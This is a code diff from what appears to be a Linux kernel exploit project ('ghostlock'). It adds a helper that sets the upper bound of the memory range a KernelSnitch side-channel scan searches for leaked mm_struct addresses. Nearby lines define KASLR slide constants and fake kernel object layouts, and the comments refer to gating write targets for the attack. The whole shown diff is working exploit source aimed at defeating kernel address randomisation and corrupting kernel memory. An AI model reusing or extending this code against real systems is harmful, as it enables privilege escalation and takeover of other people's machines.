@@ -72,6 +72,29 @@ namespace ghostlock::kernel {
     inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_IMAGE =
             KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF;
 
+    /* Declared rather than pulled in from kernel/constants.hpp: that header
+     * needs kernel/offset.h and therefore -DTARGET_CONFIG_H, which the
+     * target-constants-test compile does not pass. kernelsnitch.h declares it
+     * the same way. Defined in memory/address_space.cpp. */
+    extern uint64_t g_direct_map_end;
+
+    /* Upper bound of the region a leaked mm_struct may legally live in. The
+     * KernelSnitch scan and the acceptance check in support/util.cpp must agree,
+     * so both go through here: a scan that reaches past what the check accepts
+     * throws away real hits, and the reverse accepts addresses it never looked
+     * for. apply_iomem_cache() narrows g_direct_map_end to a measured value;
+     * until then its built-in default is only a guess that sits *below* the
+     * linear-region end, so an unmeasured map must not cap the range.
+     *
+     * Deliberately NOT the bound used by attack/ops.hpp's in_direct_map(): that
+     * one gates write targets and stays conservative on purpose. */
+    inline uint64_t direct_map_scan_end() {
+        if (g_direct_map_end == DIRECT_MAP_END)
+            return KERNELSNITCH_LINEAR_END;
+        return g_direct_map_end < KERNELSNITCH_LINEAR_END ? g_direct_map_end
+                                                         : KERNELSNITCH_LINEAR_END;
+    }
+
     inline constexpr int32_t PSELECT_WAITER_WORD_SHIFT = -2;
 
     /* Fake waiter and task layouts. */
